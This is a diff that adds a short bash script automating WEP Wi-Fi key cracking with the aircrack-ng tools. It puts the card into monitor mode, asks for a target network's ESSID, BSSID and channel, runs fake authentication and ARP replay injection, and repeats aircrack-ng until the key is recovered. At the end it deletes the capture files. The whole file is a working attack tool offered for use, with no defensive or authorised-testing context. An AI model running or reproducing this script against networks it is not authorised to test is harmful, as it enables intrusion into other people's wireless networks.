@@ -1,0 +1,53 @@
+#!/bin/bash
+
+clear
+sleep 1
+ownmac=`ifconfig wlan0 | grep wlan0 | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`
+echo "Welcome to the world of WEP cracking"
+sleep 3
+airmon-ng start wlan0
+airodump-ng mon0 &
+sleep 5 
+killall airodump-ng
+sleep 3
+echo "Enter ESSID Name of AP to target"
+read essid
+echo "Enter BSSID MAC to target"
+read bssid
+echo "Enter Channel"
+read channel
+sleep 2
+gnome-terminal -e "airodump-ng -w ./crackcap/cap --bssid $bssid --channel $channel mon0" &
+sleep 3
+aireplay-ng -1 0 -e $essid -a $bssid -h $ownmac mon0  &
+sleep 2
+gnome-terminal -e "aireplay-ng -3 -b $bssid -h $ownmac mon0" &
+sleep 15
+
+while true
+
+do
+
+        aircrack-ng -s ./crackcap/cap-01.cap
+
+        echo -n "MESSAGE: Did you get the key?: (Y or N)"
+
+        read -e CONFIRM
+
+        case $CONFIRM in
+
+                y|Y|YES|yes|Yes)
+
+                        break ;;
+
+                *) echo "MESSAGE: Will attempt to crack again" & sleep 3
+
+        esac
+
+done
+
+
+rm ./crackcap/*
+rm ./*.cap
+airmon-ng stop mon0
+
